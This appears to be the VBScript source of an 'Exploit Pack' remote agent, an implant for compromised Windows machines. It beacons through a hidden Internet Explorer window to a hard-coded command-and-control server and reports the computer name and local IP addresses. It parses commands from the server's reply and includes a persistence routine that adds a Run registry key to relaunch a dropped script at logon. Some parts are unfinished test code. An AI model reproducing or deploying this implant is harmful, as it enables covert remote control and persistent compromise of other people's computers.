'Define basic variables
Set wshNetwork = CreateObject( "WScript.Network" )
'http://127.0.0.1/&  CookieID & sendHostUrl & sendBrowserName & sendOSType & RESPONSE DATA & 1 & AgentUN & myCurrentIP
AgentUN = "jsacco"
urlServer = "http://10.4.21.137:8000/agent/&"
remoteIPService = "http://checkip.amazonaws.com/&"
CookieID = wshNetwork.ComputerName
Command = ""
sendHostUrl = GetIPAddress
'MyCurrentIP = GetRemoteIP
'MsgBox(GetRemoteIP) 
SendMagic CookieID,sendHostUrl,"WindowsVBS","Windows","Hello underlying OS! :-)",AgentUN,"1.1.1.1"


' Connect back to Exploit Pack
Function SendMagic(CookieID,sendHostUrl,SendBrowserName,SendOSType,ResponseData,AgentUN,MyCurrentIP)
	Set Magic = CreateObject("InternetExplorer.Application")
	Magic.visible = 0
	Magic.navigate urlServer & CookieID & "&" & sendHostUrl & "&" & SendBrowserName & "&" & SendOSType & "&" & ResponseData & "&1&" & AgentUN & "&" & MyCurrentIP
	Do While Magic.Busy
	   WScript.Sleep 100  ' Prevents script host from going crazy waiting for IE
	   Exit Do                  
	Loop
	HTTPGet = Magic.document.documentelement.outerhtml
	Magic.quit
	' Call CleanInput to obtain the commands to run
	Command = CleanInput(HTTPGet)
	MsgBox(Command)
	Set Magic = Nothing
End Function

' TODO Critical: Fix all this hardcode non-sense temporary iterations used for testing
Function CleanInput(HTTPGet)
	arrLines = Split(HTTPGet, "//")
    For Each strLine In arrLines
    	If InStr(strLine, "OS-") Then
			StrClean = strLine
    	End If
    Next
    arrLineFix = Split(StrClean, "</body></html>" )
    For Each strClean In arrLineFix
     	If InStr(strClean, "") Then
			arrCleanFix = strClean
	End If
    Next
    arrReturn = Split(arrCleanFix, "------------------------------------------------------------" )
    For Each strReturn In arrReturn
     	If InStr(strReturn, "") Then
			StrFinalFix = strReturn		
	End If
    Next
    CleanInput = StrFinalFix
End Function

' Get local IP address 
Function GetIPAddress()
	ipaddress = ""
	strComputer = "."
	
	Set objWMIService = GetObject("winmgmts:" _ 
	  & "{impersonationLevel=impersonate}!\\" _
	  & strComputer & "\root\cimv2")
	Set IPConfigSet = objWMIService.ExecQuery("Select " _ 
	  & "IPAddress from Win32_NetworkAdapterConfiguration " _ 
	  & "WHERE IPEnabled = 'True'")
	
	For Each IPConfig in IPConfigSet
	 If Not IsNull(IPConfig.IPAddress) Then
	 For i = LBound(IPConfig.IPAddress) To UBound(IPConfig.IPAddress)
	  If Not Instr(IPConfig.IPAddress(i), ":") > 0 Then
	  ipaddress = ipaddress & IPConfig.IPAddress(i) & vbCrLf
	  End If
	 Next
	 End If
	Next
	GetIPAddress = ipaddress
End Function


Sub Persistence()
	const HKEY_LOCAL_MACHINE = &H80000001
	strComputer = "."
	Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\"&_ 
		strComputer & "\root\default:StdRegProv")

	strKeyPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
	KeyPath = "Software\Microsoft\Windows\CurrentVersion\Run\ExploitPack"
	strValueName = "ExploitPack"
	strValue = "wscript.exe c:\windows\temp\exploitpack.vbs"


	Return = objReg.CreateKey(HKEY_LOCAL_MACHINE, KeyPath)
	If (Return = 0) And (Err.Number = 0) Then   
		Wscript.Echo "Key created"

		' Write string value to key    
		Return = objReg.SetStringValue( _
			HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue)
		If (Return = 0) And (Err.Number = 0) Then 
			Wscript.Echo "Key value set"
		Else
			Wscript.Echo "Key value set. Error = " & Err.Number
		End If
	Else
		Wscript.Echo "Key creation. Error = " & Err.Number
	End If
End Sub


'///////////////////////////////////////////
'returns values like:
'Microsoft Windows XP Professional
'///////////////////////////////////////////
Function GetOS(strComputer)
Dim objWMI

Set objWMI=GetObject("winmgmts://" & strComputer).InstancesOf("win32_operatingsystem")

For Each OS In objWMI
  GetOS=OS.Caption
Next

End Function
